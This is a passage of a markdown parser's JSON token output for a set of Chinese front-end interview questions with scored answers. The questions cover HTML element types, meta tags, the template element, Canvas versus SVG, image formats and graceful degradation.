嵌套方面：块级元素可以包含块级元素和行内元素，但一些特定的块级元素有其嵌套规则限制；行内元素一般只能包含文本和其他行内元素，不能包含\\n块级元素，不过`<a>`标签比较特殊，理论上可以包含大部分元素。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  布局方面：块级元素会独占一行，默认情况下宽度会填满父容器，如`<div>、<p>、<h1>`等；行内元素不会独占一行，在一行内可以多个行\\n内元素并排显示，如`<span>、<a>、<img>`等。\\n","task":false,"loose":false,"text":"**1：**  布局方面：块级元素会独占一行，默认情况下宽度会填满父容器，如`<div>、<p>、<h1>`等；行内元素不会独占一行，在一行内可以多个行\\n内元素并排显示，如`<span>、<a>、<img>`等。","tokens":[{"type":"text","raw":"**1：**  布局方面：块级元素会独占一行，默认情况下宽度会填满父容器，如`<div>、<p>、<h1>`等；行内元素不会独占一行，在一行内可以多个行\\n\\n内元素并排显示，如`<span>、<a>、<img>`等。","text":"**1：**  布局方面：块级元素会独占一行，默认情况下宽度会填满父容器，如`<div>、<p>、<h1>`等；行内元素不会独占一行，在一行内可以多个行\\n内元素并排显示，如`<span>、<a>、<img>`等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  布局方面：块级元素会独占一行，默认情况下宽度会填满父容器，如","text":"  布局方面：块级元素会独占一行，默认情况下宽度会填满父容器，如","escaped":false},{"type":"codespan","raw":"`<div>、<p>、<h1>`","text":"<div>、<p>、<h1>"},{"type":"text","raw":"等；行内元素不会独占一行，在一行内可以多个行\\n内元素并排显示，如","text":"等；行内元素不会独占一行，在一行内可以多个行\\n内元素并排显示，如","escaped":false},{"type":"codespan","raw":"`<span>、<a>、<img>`","text":"<span>、<a>、<img>"},{"type":"text","raw":"等。","text":"等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  尺寸方面：块级元素可以设置宽度、高度、上下内外边距等属性，能通过 CSS 自由控制其大小和位置；行内元素默认宽度和高度由内容决定，一般\\n不能直接设置宽度和高度，垂直方向的内外边距设置可能会有部分效果，但不如块级元素明显。\\n","task":false,"loose":false,"text":"**1：**  尺寸方面：块级元素可以设置宽度、高度、上下内外边距等属性，能通过 CSS 自由控制其大小和位置；行内元素默认宽度和高度由内容决定，一般\\n不能直接设置宽度和高度，垂直方向的内外边距设置可能会有部分效果，但不如块级元素明显。","tokens":[{"type":"text","raw":"**1：**  尺寸方面：块级元素可以设置宽度、高度、上下内外边距等属性，能通过 CSS 自由控制其大小和位置；行内元素默认宽度和高度由内容决定，一般\\n\\n不能直接设置宽度和高度，垂直方向的内外边距设置可能会有部分效果，但不如块级元素明显。","text":"**1：**  尺寸方面：块级元素可以设置宽度、高度、上下内外边距等属性，能通过 CSS 自由控制其大小和位置；行内元素默认宽度和高度由内容决定，一般\\n不能直接设置宽度和高度，垂直方向的内外边距设置可能会有部分效果，但不如块级元素明显。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  尺寸方面：块级元素可以设置宽度、高度、上下内外边距等属性，能通过 CSS 自由控制其大小和位置；行内元素默认宽度和高度由内容决定，一般\\n不能直接设置宽度和高度，垂直方向的内外边距设置可能会有部分效果，但不如块级元素明显。","text":"  尺寸方面：块级元素可以设置宽度、高度、上下内外边距等属性，能通过 CSS 自由控制其大小和位置；行内元素默认宽度和高度由内容决定，一般\\n不能直接设置宽度和高度，垂直方向的内外边距设置可能会有部分效果，但不如块级元素明显。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  嵌套方面：块级元素可以包含块级元素和行内元素，但一些特定的块级元素有其嵌套规则限制；行内元素一般只能包含文本和其他行内元素，不能包含\\n块级元素，不过`<a>`标签比较特殊，理论上可以包含大部分元素。","task":false,"loose":false,"text":"**1：**  嵌套方面：块级元素可以包含块级元素和行内元素，但一些特定的块级元素有其嵌套规则限制；行内元素一般只能包含文本和其他行内元素，不能包含\\n块级元素，不过`<a>`标签比较特殊，理论上可以包含大部分元素。","tokens":[{"type":"text","raw":"**1：**  嵌套方面：块级元素可以包含块级元素和行内元素，但一些特定的块级元素有其嵌套规则限制；行内元素一般只能包含文本和其他行内元素，不能包含\\n\\n块级元素，不过`<a>`标签比较特殊，理论上可以包含大部分元素。","text":"**1：**  嵌套方面：块级元素可以包含块级元素和行内元素，但一些特定的块级元素有其嵌套规则限制；行内元素一般只能包含文本和其他行内元素，不能包含\\n块级元素，不过`<a>`标签比较特殊，理论上可以包含大部分元素。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  嵌套方面：块级元素可以包含块级元素和行内元素，但一些特定的块级元素有其嵌套规则限制；行内元素一般只能包含文本和其他行内元素，不能包含\\n块级元素，不过","text":"  嵌套方面：块级元素可以包含块级元素和行内元素，但一些特定的块级元素有其嵌套规则限制；行内元素一般只能包含文本和其他行内元素，不能包含\\n块级元素，不过","escaped":false},{"type":"codespan","raw":"`<a>`","text":"<a>"},{"type":"text","raw":"标签比较特殊，理论上可以包含大部分元素。","text":"标签比较特殊，理论上可以包含大部分元素。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 19. 请解释 meta 标签的作用，并列举几个常见的 meta 标签及其功能\\n\\n","depth":2,"text":"19. 请解释 meta 标签的作用，并列举几个常见的 meta 标签及其功能","tokens":[{"type":"text","raw":"19. 请解释 meta 标签的作用，并列举几个常见的 meta 标签及其功能","text":"19. 请解释 meta 标签的作用，并列举几个常见的 meta 标签及其功能","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：**  meta 标签用于提供有关 HTML 文档的元数据，这些元数据不会显示在页面上，但对浏览器和搜索引擎等非常重要。\\n- **1：**  `<meta charset=\\"UTF-8\\">`：用于指定文档的字符编码，确保页面可以正确显示不同语言的字符，这里设置为 UTF-8 编码，是目前最常用的字符编码方式，支持多种语言。\\n- **1：**  `<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">`：主要用于移动端开发，设置视口的属性，`width=device-width` 表示视口\\n宽度等于设备的屏幕宽度，`initial-scale=1.0` 表示初始缩放比例为 1.0。这有助于在不同设备上实现响应式布局，确保页面在移动设备上的显示效果良好。\\n- **1：**  `<meta name=\\"description\\" content=\\"这是一个关于 HTML 面试题的页面描述\\">`：为页面提供一个简短的描述，搜索引擎会使用这个描述来显示在搜索结果中，影响页面的搜\\n索排名和用户点击行为，因此应该简洁且准确地描述页面内容。\\n- **1：**  `<meta name=\\"keywords\\" content=\\"HTML, 面试题, 网页开发\\">`：用于指定页面的关键词，帮助搜索引擎理解页面的主要内容，但在现代 SEO 中，其重要性相对降低，因为\\n搜索引擎更多地依赖页面的实际内容和结构，但仍可作为辅助信息。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  meta 标签用于提供有关 HTML 文档的元数据，这些元数据不会显示在页面上，但对浏览器和搜索引擎等非常重要。\\n","task":false,"loose":false,"text":"**1：**  meta 标签用于提供有关 HTML 文档的元数据，这些元数据不会显示在页面上，但对浏览器和搜索引擎等非常重要。","tokens":[{"type":"text","raw":"**1：**  meta 标签用于提供有关 HTML 文档的元数据，这些元数据不会显示在页面上，但对浏览器和搜索引擎等非常重要。","text":"**1：**  meta 标签用于提供有关 HTML 文档的元数据，这些元数据不会显示在页面上，但对浏览器和搜索引擎等非常重要。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  meta 标签用于提供有关 HTML 文档的元数据，这些元数据不会显示在页面上，但对浏览器和搜索引擎等非常重要。","text":"  meta 标签用于提供有关 HTML 文档的元数据，这些元数据不会显示在页面上，但对浏览器和搜索引擎等非常重要。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  `<meta charset=\\"UTF-8\\">`：用于指定文档的字符编码，确保页面可以正确显示不同语言的字符，这里设置为 UTF-8 编码，是目前最常用的字符编码方式，支持多种语言。\\n","task":false,"loose":false,"text":"**1：**  `<meta charset=\\"UTF-8\\">`：用于指定文档的字符编码，确保页面可以正确显示不同语言的字符，这里设置为 UTF-8 编码，是目前最常用的字符编码方式，支持多种语言。","tokens":[{"type":"text","raw":"**1：**  `<meta charset=\\"UTF-8\\">`：用于指定文档的字符编码，确保页面可以正确显示不同语言的字符，这里设置为 UTF-8 编码，是目前最常用的字符编码方式，支持多种语言。","text":"**1：**  `<meta charset=\\"UTF-8\\">`：用于指定文档的字符编码，确保页面可以正确显示不同语言的字符，这里设置为 UTF-8 编码，是目前最常用的字符编码方式，支持多种语言。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  ","text":"  ","escaped":false},{"type":"codespan","raw":"`<meta charset=\\"UTF-8\\">`","text":"<meta charset=\\"UTF-8\\">"},{"type":"text","raw":"：用于指定文档的字符编码，确保页面可以正确显示不同语言的字符，这里设置为 UTF-8 编码，是目前最常用的字符编码方式，支持多种语言。","text":"：用于指定文档的字符编码，确保页面可以正确显示不同语言的字符，这里设置为 UTF-8 编码，是目前最常用的字符编码方式，支持多种语言。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  `<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">`：主要用于移动端开发，设置视口的属性，`width=device-width` 表示视口\\n宽度等于设备的屏幕宽度，`initial-scale=1.0` 表示初始缩放比例为 1.0。这有助于在不同设备上实现响应式布局，确保页面在移动设备上的显示效果良好。\\n","task":false,"loose":false,"text":"**1：**  `<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">`：主要用于移动端开发，设置视口的属性，`width=device-width` 表示视口\\n宽度等于设备的屏幕宽度，`initial-scale=1.0` 表示初始缩放比例为 1.0。这有助于在不同设备上实现响应式布局，确保页面在移动设备上的显示效果良好。","tokens":[{"type":"text","raw":"**1：**  `<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">`：主要用于移动端开发，设置视口的属性，`width=device-width` 表示视口\\n\\n宽度等于设备的屏幕宽度，`initial-scale=1.0` 表示初始缩放比例为 1.0。这有助于在不同设备上实现响应式布局，确保页面在移动设备上的显示效果良好。","text":"**1：**  `<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">`：主要用于移动端开发，设置视口的属性，`width=device-width` 表示视口\\n宽度等于设备的屏幕宽度，`initial-scale=1.0` 表示初始缩放比例为 1.0。这有助于在不同设备上实现响应式布局，确保页面在移动设备上的显示效果良好。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  ","text":"  ","escaped":false},{"type":"codespan","raw":"`<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">`","text":"<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">"},{"type":"text","raw":"：主要用于移动端开发，设置视口的属性，","text":"：主要用于移动端开发，设置视口的属性，","escaped":false},{"type":"codespan","raw":"`width=device-width`","text":"width=device-width"},{"type":"text","raw":" 表示视口\\n宽度等于设备的屏幕宽度，","text":" 表示视口\\n宽度等于设备的屏幕宽度，","escaped":false},{"type":"codespan","raw":"`initial-scale=1.0`","text":"initial-scale=1.0"},{"type":"text","raw":" 表示初始缩放比例为 1.0。这有助于在不同设备上实现响应式布局，确保页面在移动设备上的显示效果良好。","text":" 表示初始缩放比例为 1.0。这有助于在不同设备上实现响应式布局，确保页面在移动设备上的显示效果良好。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  `<meta name=\\"description\\" content=\\"这是一个关于 HTML 面试题的页面描述\\">`：为页面提供一个简短的描述，搜索引擎会使用这个描述来显示在搜索结果中，影响页面的搜\\n索排名和用户点击行为，因此应该简洁且准确地描述页面内容。\\n","task":false,"loose":false,"text":"**1：**  `<meta name=\\"description\\" content=\\"这是一个关于 HTML 面试题的页面描述\\">`：为页面提供一个简短的描述，搜索引擎会使用这个描述来显示在搜索结果中，影响页面的搜\\n索排名和用户点击行为，因此应该简洁且准确地描述页面内容。","tokens":[{"type":"text","raw":"**1：**  `<meta name=\\"description\\" content=\\"这是一个关于 HTML 面试题的页面描述\\">`：为页面提供一个简短的描述，搜索引擎会使用这个描述来显示在搜索结果中，影响页面的搜\\n\\n索排名和用户点击行为，因此应该简洁且准确地描述页面内容。","text":"**1：**  `<meta name=\\"description\\" content=\\"这是一个关于 HTML 面试题的页面描述\\">`：为页面提供一个简短的描述，搜索引擎会使用这个描述来显示在搜索结果中，影响页面的搜\\n索排名和用户点击行为，因此应该简洁且准确地描述页面内容。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  ","text":"  ","escaped":false},{"type":"codespan","raw":"`<meta name=\\"description\\" content=\\"这是一个关于 HTML 面试题的页面描述\\">`","text":"<meta name=\\"description\\" content=\\"这是一个关于 HTML 面试题的页面描述\\">"},{"type":"text","raw":"：为页面提供一个简短的描述，搜索引擎会使用这个描述来显示在搜索结果中，影响页面的搜\\n索排名和用户点击行为，因此应该简洁且准确地描述页面内容。","text":"：为页面提供一个简短的描述，搜索引擎会使用这个描述来显示在搜索结果中，影响页面的搜\\n索排名和用户点击行为，因此应该简洁且准确地描述页面内容。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  `<meta name=\\"keywords\\" content=\\"HTML, 面试题, 网页开发\\">`：用于指定页面的关键词，帮助搜索引擎理解页面的主要内容，但在现代 SEO 中，其重要性相对降低，因为\\n搜索引擎更多地依赖页面的实际内容和结构，但仍可作为辅助信息。","task":false,"loose":false,"text":"**1：**  `<meta name=\\"keywords\\" content=\\"HTML, 面试题, 网页开发\\">`：用于指定页面的关键词，帮助搜索引擎理解页面的主要内容，但在现代 SEO 中，其重要性相对降低，因为\\n搜索引擎更多地依赖页面的实际内容和结构，但仍可作为辅助信息。","tokens":[{"type":"text","raw":"**1：**  `<meta name=\\"keywords\\" content=\\"HTML, 面试题, 网页开发\\">`：用于指定页面的关键词，帮助搜索引擎理解页面的主要内容，但在现代 SEO 中，其重要性相对降低，因为\\n\\n搜索引擎更多地依赖页面的实际内容和结构，但仍可作为辅助信息。","text":"**1：**  `<meta name=\\"keywords\\" content=\\"HTML, 面试题, 网页开发\\">`：用于指定页面的关键词，帮助搜索引擎理解页面的主要内容，但在现代 SEO 中，其重要性相对降低，因为\\n搜索引擎更多地依赖页面的实际内容和结构，但仍可作为辅助信息。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  ","text":"  ","escaped":false},{"type":"codespan","raw":"`<meta name=\\"keywords\\" content=\\"HTML, 面试题, 网页开发\\">`","text":"<meta name=\\"keywords\\" content=\\"HTML, 面试题, 网页开发\\">"},{"type":"text","raw":"：用于指定页面的关键词，帮助搜索引擎理解页面的主要内容，但在现代 SEO 中，其重要性相对降低，因为\\n搜索引擎更多地依赖页面的实际内容和结构，但仍可作为辅助信息。","text":"：用于指定页面的关键词，帮助搜索引擎理解页面的主要内容，但在现代 SEO 中，其重要性相对降低，因为\\n搜索引擎更多地依赖页面的实际内容和结构，但仍可作为辅助信息。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 20. 请阐述 HTML5 中 `<template>` 元素的特点和优势\\n\\n","depth":2,"text":"20. 请阐述 HTML5 中 `<template>` 元素的特点和优势","tokens":[{"type":"text","raw":"20. 请阐述 HTML5 中 ","text":"20. 请阐述 HTML5 中 ","escaped":false},{"type":"codespan","raw":"`<template>`","text":"<template>"},{"type":"text","raw":" 元素的特点和优势","text":" 元素的特点和优势","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：**  特点：`<template>` 元素是一个存储内容的容器，其中的内容在页面加载时不会被渲染，只有在通过 JavaScript 等方式调用时才会被使用。它包含的内容可以是完整的 HTML 片\\n段，包括标签、文本、样式等。\\n- **1：**  优势：实现了代码的分离和复用，提高了代码的可维护性。避免了在 JavaScript 中通过字符串拼接的方式创建复杂的 HTML 结构，减少了错误和代码的冗余。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  特点：`<template>` 元素是一个存储内容的容器，其中的内容在页面加载时不会被渲染，只有在通过 JavaScript 等方式调用时才会被使用。它包含的内容可以是完整的 HTML 片\\n段，包括标签、文本、样式等。\\n","task":false,"loose":false,"text":"**1：**  特点：`<template>` 元素是一个存储内容的容器，其中的内容在页面加载时不会被渲染，只有在通过 JavaScript 等方式调用时才会被使用。它包含的内容可以是完整的 HTML 片\\n段，包括标签、文本、样式等。","tokens":[{"type":"text","raw":"**1：**  特点：`<template>` 元素是一个存储内容的容器，其中的内容在页面加载时不会被渲染，只有在通过 JavaScript 等方式调用时才会被使用。它包含的内容可以是完整的 HTML 片\\n\\n段，包括标签、文本、样式等。","text":"**1：**  特点：`<template>` 元素是一个存储内容的容器，其中的内容在页面加载时不会被渲染，只有在通过 JavaScript 等方式调用时才会被使用。它包含的内容可以是完整的 HTML 片\\n段，包括标签、文本、样式等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  特点：","text":"  特点：","escaped":false},{"type":"codespan","raw":"`<template>`","text":"<template>"},{"type":"text","raw":" 元素是一个存储内容的容器，其中的内容在页面加载时不会被渲染，只有在通过 JavaScript 等方式调用时才会被使用。它包含的内容可以是完整的 HTML 片\\n段，包括标签、文本、样式等。","text":" 元素是一个存储内容的容器，其中的内容在页面加载时不会被渲染，只有在通过 JavaScript 等方式调用时才会被使用。它包含的内容可以是完整的 HTML 片\\n段，包括标签、文本、样式等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  优势：实现了代码的分离和复用，提高了代码的可维护性。避免了在 JavaScript 中通过字符串拼接的方式创建复杂的 HTML 结构，减少了错误和代码的冗余。","task":false,"loose":false,"text":"**1：**  优势：实现了代码的分离和复用，提高了代码的可维护性。避免了在 JavaScript 中通过字符串拼接的方式创建复杂的 HTML 结构，减少了错误和代码的冗余。","tokens":[{"type":"text","raw":"**1：**  优势：实现了代码的分离和复用，提高了代码的可维护性。避免了在 JavaScript 中通过字符串拼接的方式创建复杂的 HTML 结构，减少了错误和代码的冗余。","text":"**1：**  优势：实现了代码的分离和复用，提高了代码的可维护性。避免了在 JavaScript 中通过字符串拼接的方式创建复杂的 HTML 结构，减少了错误和代码的冗余。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  优势：实现了代码的分离和复用，提高了代码的可维护性。避免了在 JavaScript 中通过字符串拼接的方式创建复杂的 HTML 结构，减少了错误和代码的冗余。","text":"  优势：实现了代码的分离和复用，提高了代码的可维护性。避免了在 JavaScript 中通过字符串拼接的方式创建复杂的 HTML 结构，减少了错误和代码的冗余。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 21. Canvas 和 SVG 有何区别\\n\\n","depth":2,"text":"21. Canvas 和 SVG 有何区别","tokens":[{"type":"text","raw":"21. Canvas 和 SVG 有何区别","text":"21. Canvas 和 SVG 有何区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"Canvas 是基于像素的绘图，适用于动画、游戏、图表等，特别是需要高性能绘制的场景。","text":"Canvas 是基于像素的绘图，适用于动画、游戏、图表等，特别是需要高性能绘制的场景。","tokens":[{"type":"text","raw":"Canvas 是基于像素的绘图，适用于动画、游戏、图表等，特别是需要高性能绘制的场景。","text":"Canvas 是基于像素的绘图，适用于动画、游戏、图表等，特别是需要高性能绘制的场景。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"SVG 是基于矢量的绘图，适用于图标、复杂图形、可缩放的图形等。","text":"SVG 是基于矢量的绘图，适用于图标、复杂图形、可缩放的图形等。","tokens":[{"type":"text","raw":"SVG 是基于矢量的绘图，适用于图标、复杂图形、可缩放的图形等。","text":"SVG 是基于矢量的绘图，适用于图标、复杂图形、可缩放的图形等。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 22. png、jpg、gif这些图片格式解释一下，分别什么时候用？\\n\\n","depth":2,"text":"22. png、jpg、gif这些图片格式解释一下，分别什么时候用？","tokens":[{"type":"text","raw":"22. png、jpg、gif这些图片格式解释一下，分别什么时候用？","text":"22. png、jpg、gif这些图片格式解释一下，分别什么时候用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"png：无损压缩，尺寸体积要比jpg/jpeg的大。适合做小图标","text":"png：无损压缩，尺寸体积要比jpg/jpeg的大。适合做小图标","tokens":[{"type":"text","raw":"png：无损压缩，尺寸体积要比jpg/jpeg的大。适合做小图标","text":"png：无损压缩，尺寸体积要比jpg/jpeg的大。适合做小图标","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"jpg：采用压缩算法，有一点失真，比png体积要小。适合做中大图片","text":"jpg：采用压缩算法，有一点失真，比png体积要小。适合做中大图片","tokens":[{"type":"text","raw":"jpg：采用压缩算法，有一点失真，比png体积要小。适合做中大图片","text":"jpg：采用压缩算法，有一点失真，比png体积要小。适合做中大图片","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"gif：一般是做动图","text":"gif：一般是做动图","tokens":[{"type":"text","raw":"gif：一般是做动图","text":"gif：一般是做动图","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"webp:同时支持有损或者无损压缩，相同质量的图片，webp具有更小的体积。兼容性不是特别好","text":"webp:同时支持有损或者无损压缩，相同质量的图片，webp具有更小的体积。兼容性不是特别好","tokens":[{"type":"text","raw":"webp:同时支持有损或者无损压缩，相同质量的图片，webp具有更小的体积。兼容性不是特别好","text":"webp:同时支持有损或者无损压缩，相同质量的图片，webp具有更小的体积。兼容性不是特别好","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 23. 什么是 优雅降级、渐进增强？\\n\\n","depth":2,"text":"23. 什么是 优雅降级、渐进增强？","tokens":[{"type":"text","raw":"23. 什么是 优雅降级、渐进增强？","text":"23. 什么是 优雅降级、渐进增强？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"优雅降级（Graceful Degradation）和渐进增强（Progressive Enhancement）是Web开发中用于提高网站或应用在不同环境和设备上的适应性的两种策略。","text":"优雅降级（Graceful Degradation）和渐进增强（Progressive Enhancement）是Web开发中用于提高网站或应用在不同环境和设备上的适应性的两种策略。","tokens":[{"type":"text","raw":"优雅降级（Graceful Degradation）和渐进增强（Progressive Enhancement）是Web开发中用于提高网站或应用在不同环境和设备上的适应性的两种策略。","text":"优雅降级（Graceful Degradation）和渐进增强（Progressive 